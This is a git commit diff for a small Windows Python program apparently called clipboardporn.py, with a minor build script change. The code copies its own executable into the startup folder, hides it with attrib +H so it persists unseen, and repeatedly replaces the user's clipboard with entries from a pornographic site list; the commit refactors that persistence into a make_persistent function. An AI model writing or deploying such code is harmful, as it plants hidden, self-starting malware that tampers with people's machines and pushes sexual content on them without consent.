d2071d4f1f7e877fc9f92bff0d7b5f212693e0d0
Bruno Fauth <149593@upf.br>
2019-12-06 18:35:18 -0300

    added some newlines and shortened names

--- build.sh
+++ build.sh
@@ -22,3 +22,4 @@ fi
 
 
 wineconsole build.bat
+
--- clipboardporn.py
+++ clipboardporn.py
@@ -11,13 +11,13 @@ SECRET_DIR = winshell.startup()
 SECRET_DST = os.path.join(SECRET_DIR, os.path.basename(sys.executable))
 
 
-def resource_path(relative_path):
+def abs_path(relative_path):
     """ Get absolute path to resource, works for dev and for PyInstaller """
     base = getattr(sys, "_MEIPASS", os.path.dirname(os.path.abspath(__file__)))
     return os.path.join(base, relative_path)
 
 
-with open(resource_path("porn-sites.list")) as src:
+with open(abs_path("porn-sites.list")) as src:
     PORN = src.readlines()
 
 
@@ -32,12 +32,17 @@ def mess_clipboard(delay=1):
         old_content = new_content
 
 
+def make_persistent():
+    winshell.copy_file(sys.executable, SECRET_DIR, False, True, False, True)
+    os.system(f'attrib +H "{SECRET_DST}"')
+
+
 def main():
     if getattr(sys, "frozen", False) and sys.executable != SECRET_DIR:
-        winshell.copy_file(sys.executable, SECRET_DIR, False, True, False, True)
-        os.system(f'attrib +H "{SECRET_DST}"')
+        make_persistent()
     mess_clipboard()
 
 
 if __name__ == "__main__":
     main()
+
